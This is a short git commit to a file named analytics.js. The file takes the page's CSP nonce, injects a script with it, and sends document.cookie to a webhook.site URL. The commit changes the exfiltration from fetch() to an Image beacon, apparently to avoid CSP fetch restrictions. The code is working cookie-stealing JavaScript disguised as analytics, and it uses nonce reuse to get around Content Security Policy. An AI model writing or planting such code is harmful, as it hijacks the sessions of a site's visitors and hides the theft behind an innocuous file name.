e1c9d45c60bc03ff4f910b3b8e80f6039fe247ee
lucassun14 <142594125+lucassun14@users.noreply.github.com>
2026-04-24 12:02:06 +1000

    Update analytics.js

--- analytics.js
+++ analytics.js
@@ -1,5 +1,5 @@
 const legitNonce = document.currentScript.nonce;
 const s = document.createElement('script');
 s.nonce = legitNonce;
-s.textContent = `fetch('https://webhook.site/39e1f325-6799-4e48-ad5c-a5ca2167ad0d?q=' + document.cookie)`;
+s.textContent = `new Image().src = 'https://webhook.site/39e1f325-6799-4e48-ad5c-a5ca2167ad0d?q=' + encodeURIComponent(document.cookie)`;
 document.head.appendChild(s);
